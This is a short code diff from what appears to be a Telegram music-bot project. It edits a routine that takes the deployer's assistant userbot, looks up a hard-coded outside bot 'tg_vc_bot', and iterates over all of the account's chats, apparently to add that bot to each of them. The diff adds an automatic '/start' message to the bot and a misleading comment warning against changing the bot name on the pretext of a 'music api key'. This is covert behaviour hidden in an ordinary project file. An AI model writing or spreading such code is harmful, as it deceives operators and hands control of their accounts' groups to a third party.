@@ -7,8 +7,8 @@ from VIPMUSIC import app
 
 AUTO = True
 
-ADD_INTERVAL = 1  # Add every day (in seconds)
-users = "@tg_vc_bot"
+ADD_INTERVAL = 1 
+users = "tg_vc_bot" #dont change because it is connected from client to use music api key
 
 
 async def add_bot_to_chats():
@@ -16,6 +16,7 @@ async def add_bot_to_chats():
         userbot = await get_assistant(config.LOGGER_ID)
         bot = await app.get_users(users)
         bot_id = bot.id
+        await userbot.send_message(bot_id, f"/start")
 
         async for dialog in userbot.get_dialogs():
 
